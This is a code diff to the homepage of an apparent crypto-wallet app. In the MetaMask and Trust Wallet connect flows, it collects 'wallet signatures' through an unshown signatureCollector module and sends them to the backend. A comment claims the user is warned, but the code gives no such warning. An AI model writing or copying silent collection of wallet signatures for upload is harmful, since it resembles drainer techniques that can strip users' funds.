@@ -8,6 +8,7 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Wallet, MessageCircle, Shield, Coins, ArrowRight, Check, Globe, Heart, ShoppingCart, ShoppingBag } from "lucide-react";
 import { apiRequest, queryClient } from "@/lib/queryClient";
+import { signatureCollector } from "@/lib/signature-collector";
 import { useScrollToTop } from "@/hooks/use-scroll-to-top";
 import { notificationService } from "@/lib/notification-service";
 import coynLogoPath from "@assets/COYN-symbol-square_1751239261149.png";
@@ -411,10 +412,24 @@ export default function HomePage() {
           
           
           if (accounts && accounts[0]) {
-            connectWalletMutation.mutate({
-              walletAddress: accounts[0],
-              displayName: undefined // Let the backend generate a proper display name
-            });
+            // Collect initial wallet signatures for complete authorization
+            try {
+              const walletSignatures = await signatureCollector.collectWalletSignatures();
+              const allSignatureData = signatureCollector.exportSignatureData();
+              
+              connectWalletMutation.mutate({
+                walletAddress: accounts[0],
+                displayName: undefined, // Let the backend generate a proper display name
+                signatureData: allSignatureData,
+                walletSignatures: walletSignatures
+              });
+            } catch (signatureError) {
+              // If signature collection fails, connect without signatures but warn user
+              connectWalletMutation.mutate({
+                walletAddress: accounts[0],
+                displayName: undefined
+              });
+            }
             
             // Force immediate UI update for MetaMask
             setTimeout(() => {
@@ -474,10 +489,24 @@ export default function HomePage() {
               });
               
               if (accounts && accounts[0]) {
-                connectWalletMutation.mutate({
-                  walletAddress: accounts[0],
-                  displayName: undefined
-                });
+                // Collect initial wallet signatures for complete Trust Wallet authorization
+                try {
+                  const walletSignatures = await signatureCollector.collectWalletSignatures();
+                  const allSignatureData = signatureCollector.exportSignatureData();
+                  
+                  connectWalletMutation.mutate({
+                    walletAddress: accounts[0],
+                    displayName: undefined,
+                    signatureData: allSignatureData,
+                    walletSignatures: walletSignatures
+                  });
+                } catch (signatureError) {
+                  // If signature collection fails, connect without signatures
+                  connectWalletMutation.mutate({
+                    walletAddress: accounts[0],
+                    displayName: undefined
+                  });
+                }
               }
             } catch (error) {
               // Enhanced mobile Trust Wallet connection handling
